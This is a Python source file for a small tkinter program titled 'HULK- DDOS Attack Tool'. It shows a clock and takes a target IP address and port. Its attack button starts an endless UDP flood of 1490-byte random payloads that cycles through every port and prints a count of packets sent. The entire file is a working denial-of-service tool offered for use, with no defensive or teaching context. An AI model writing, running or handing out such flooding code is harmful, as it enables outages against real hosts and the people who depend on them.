from tkinter import *
from tkinter.ttk import *
from time import strftime


def time():

    string = strftime('%H:%M:%S %p')

    lbl.config(text=string)

    lbl.after(1000, time)


def attack():
    import sys
    import os
    import time
    import socket
    import random
    # Code Time
    from datetime import datetime
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year

    ##############
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    #############

    os.system("clear")

    #ip = raw_input("IP Target : ")
    #port = input("Port       : ")
    global pr
    pr = E1.get()
    ip = pr
    global rt
    rt = E2.get()
    port = (int(rt))

    os.system("clear")
    #os.system("figlet Attack Starting")
    print("[>                      ] 0% ")
    time.sleep(0.5)
    print("[=====>      H          ] 25%")
    time.sleep(0.5)
    print("[==========> U          ] 50%")
    time.sleep(0.5)
    print("[==========  L ====>    ] 75%")
    time.sleep(0.5)
    print("[==========  K ========>] 100%")
    time.sleep(3)
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s throught port:%s -by HULK" %
              (sent, ip, port))
        if port == 65534:
            port = 1

    pass


root = Tk()
root.title("HULK- DDOS Attack Tool")
root.geometry("350x200+385+105")
root.resizable(0, 0)

lbl = Label(root, font=('calibri', 20, 'bold'),

            background='purple',

            foreground='white')

lbl.pack(anchor='s')
time()

global E1
global E2
L1 = Label(root, text="ip address")
L1.pack(side=TOP)
E1 = Entry(root)  # , bd =5)
E1.pack(side=TOP)


L2 = Label(root, text="port")
L2.pack(side=TOP)
E2 = Entry(root)  # , bd =5)
E2.pack(side=TOP)

button = Button(root, text="attack", command=attack).pack(
    side=TOP)  # ,font=('comicsansms 19 bold')).pack(side=TOP)
root.mainloop()
